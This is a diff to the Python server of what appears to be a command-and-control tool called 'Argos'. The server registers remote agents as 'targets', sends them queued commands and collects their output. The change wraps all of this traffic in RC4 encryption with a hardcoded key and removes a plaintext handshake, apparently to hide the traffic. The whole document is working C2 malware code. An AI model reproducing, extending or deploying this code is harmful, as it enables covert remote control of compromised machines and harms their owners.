@@ -16,7 +16,7 @@ def encrypt_rc4(key, plaintext):
 PORT = 13337
 ARGOS_SERVER_URL = "http://127.0.0.1:5000"
 API_KEY = "123456789"
-SECRET_KEY = b"ArgosSecretKey"
+SECRET_KEY = b"ArgosRc4Key!!"
 
 
 anonymous = 'f0f0f0f0-f0f0-f0f0-f0f0-f0f0f0f0f0f0'
@@ -95,14 +95,9 @@ class ServerHandler(asyncio.Protocol):
         """
         Called by asyncio when data is received
         """
-        message = uncorrupt_data(data)
+        message = uncorrupt_data(encrypt_rc4(SECRET_KEY, data))
         message_parts = message.split(':')
         uniq_id, data = message_parts[0], ':'.join(message_parts[1:])
-
-        if message == "hello":
-            print("ok")
-            self.transport.write(encrypt_rc4(SECRET_KEY, b"hello m8"))
-            return
 
         # We first check if the agent is anonymous
         if uniq_id == anonymous:
@@ -118,7 +113,8 @@ class ServerHandler(asyncio.Protocol):
                 print("[FATAL] - Error while creating new target, id returned is -1")
                 return
 
-            self.transport.write(client_id.encode())
+            print("sending id")
+            self.transport.write(encrypt_rc4(SECRET_KEY, client_id.encode()))
             self.transport.close()
             print(f"[DEBUG] - new target created uid: {client_id}")
 
@@ -150,8 +146,7 @@ class ServerHandler(asyncio.Protocol):
                     return
 
                 print(f"[DEBUG] - sent {job['command']}({job['command_id']}) to {uniq_id}.")
-                client['last_job'] = job
-                self.transport.write(f"{job['command_id']}:{job['command']}".encode())
+                self.transport.write(encrypt_rc4(SECRET_KEY, f"{job['command_id']}:{job['command']}".encode()))
             else:
                 data_parts = data.split(':')
                 command_id, command_output = data_parts[0], ':'.join(data_parts[1:])
